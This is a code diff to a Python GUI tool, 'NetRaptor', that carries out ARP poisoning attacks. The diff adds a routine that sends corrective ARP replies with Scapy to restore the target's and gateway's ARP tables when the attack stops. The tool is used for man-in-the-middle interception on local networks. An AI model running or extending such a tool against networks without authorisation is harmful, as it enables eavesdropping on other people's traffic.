@@ -143,18 +143,27 @@ class NetRaptorApp:
         self.attack_thread.start()
 
     def stop_attack(self):
-        # Stop the attack and disable IP forwarding
+        
         self.running = False
         disable_ip_forwarding()
-        
+
         if self.attack_thread:
-            self.attack_thread.join()  # Wait for the thread to finish
-        
-        # Re-enable the attack button and disable the stop button
+           self.attack_thread.join()
+
+        # Find original MACs from scanned hosts
+        target = self.selected_host.get()
+        gateway = self.selected_gateway.get()
+
+        if target != "Select a host (Target)" and gateway != "Select a gateway":
+           target_ip, target_mac = target.split(" ")[0], target.split(" ")[1].strip("()")
+           gateway_ip, gateway_mac = gateway.split(" ")[0], gateway.split(" ")[1].strip("()")
+           self.restore_network(target_ip, target_mac, gateway_ip, gateway_mac)
+
         self.attack_button.config(state=tk.NORMAL)
         self.stop_button.config(state=tk.DISABLED)
-        
-        messagebox.showinfo("Attack Stopped", "ARP poisoning attack has been stopped.")
+
+        messagebox.showinfo("Attack Stopped", "ARP poisoning stopped and ARP tables restored.")
+
 
     def arp_poison(self, target_ip, target_mac, gateway_ip):
         try:
@@ -172,10 +181,18 @@ class NetRaptorApp:
         except Exception as e:
             messagebox.showerror("Error", str(e))
 
+    def restore_network(self, target_ip, target_mac, gateway_ip, gateway_mac):
+         # Restore ARP for Target to Gateway
+         send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)
+
+         # Restore ARP for Gateway to Target
+         send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=5, verbose=0)
+       
 # Main application window
 if __name__ == "__main__":
     root = tk.Tk()
     app = NetRaptorApp(root)
     root.mainloop()
+
 
 
